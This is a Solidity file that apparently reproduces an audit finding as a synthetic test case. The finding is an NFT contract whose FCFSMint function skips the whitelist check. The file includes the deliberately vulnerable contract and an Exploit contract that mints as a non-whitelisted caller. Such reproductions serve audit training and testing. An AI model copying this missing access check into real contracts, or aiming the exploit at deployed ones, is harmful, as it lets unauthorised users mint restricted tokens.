// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Vallarok RunaAGI — FCFSMint has no whitelist check (Shieldify H-02, 2024-04).
    SYNTHETIC, cheatcode-free. The readme says FCFS is two extra NFTs for
    whitelisted wallets. FCFSMint checks a signer and the 0.06 ETH price,
    but never reads whitelist[msg.sender]. A non-whitelisted caller who
    presents a signer signature receives the NFT and pays only salePrice.
    The fixed path reverts unless whitelist[msg.sender] is true. */

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4);
}

library Sig {
    function toEthSignedMessageHash(bytes32 hash) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
    }

    function recover(bytes32 hash, bytes memory signature) internal pure returns (address) {
        require(signature.length == 65, "sig");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }
        return ecrecover(hash, v, r, s);
    }
}

contract Holder {}

contract RunaAGI {
    using Sig for bytes32;

    uint256 public constant salePrice = 0.06 ether;
    uint256 public saleSupply = 1450;
    uint256 public saleSupplyMinted;
    uint256 public totalSupply;
    uint256 public tokenIdCounter;
    address public immutable signer;
    bool public isFCFSMintingActive = true;

    mapping(address => bool) public whitelist;
    mapping(address => uint256) public fcfsMinted;
    mapping(bytes => bool) public signatures;
    mapping(uint256 => address) public ownerOf;
    mapping(address => uint256) public balanceOf;

    constructor(address _signer) {
        signer = _signer;
    }

    function setWhitelist(address account, bool allowed) external {
        whitelist[account] = allowed;
    }

    function FCFSMint(uint256 _salt, bytes32 _msgHash, bytes memory _signature) external payable virtual {
        require(isFCFSMintingActive, "FCFS minting is not active");
        require(saleSupplyMinted + 1 <= saleSupply, "Maximum supply reached");
        require(msg.value == salePrice, "Incorrect ether amount");
        require(fcfsMinted[msg.sender] + 1 <= 2, "Limit reached");

        bytes32 msgHash = keccak256(abi.encodePacked(msg.sender, _salt));
        bytes32 signedMsgHash = msgHash.toEthSignedMessageHash();

        require(signedMsgHash == _msgHash, "Invalid message hash!");
        require(_msgHash.recover(_signature) == signer, "Invalid signer!");
        signatures[_signature] = true;

        // @> VULN: no whitelist[msg.sender] check. A wallet that is not on the whitelist still receives the NFT and pays only salePrice.
        _safeMint(msg.sender, tokenIdCounter);
        tokenIdCounter++;
        totalSupply++;
        saleSupplyMinted++;
        fcfsMinted[msg.sender] += 1;
    }

    function _safeMint(address to, uint256 tokenId) internal {
        require(ownerOf[tokenId] == address(0), "exists");
        ownerOf[tokenId] = to;
        balanceOf[to] += 1;
        if (to.code.length > 0) {
            bytes4 ret = IERC721Receiver(to).onERC721Received(msg.sender, address(0), tokenId, "");
            require(ret == IERC721Receiver.onERC721Received.selector, "receiver");
        }
    }
}

contract Exploit {
    address public constant SIGNER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    uint256 public constant PRICE = 0.06 ether;

    RunaAGI public nft; // nonce 1
    Holder public listed; // nonce 2

    constructor() {
        nft = new RunaAGI(SIGNER);
        listed = new Holder();
        nft.setWhitelist(address(listed), true);
    }

    function run(uint256 salt, bytes32 msgHash, bytes calldata signature) external payable {
        require(nft.whitelist(address(listed)) == true, "listed");
        require(nft.whitelist(address(this)) == false, "not listed");
        nft.FCFSMint{value: PRICE}(salt, msgHash, signature);
        require(nft.ownerOf(0) == address(this), "received");
        require(nft.balanceOf(address(this)) == 1, "one nft");
        require(address(nft).balance == PRICE, "paid sale price");
        require(nft.fcfsMinted(address(this)) == 1, "fcfs");
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
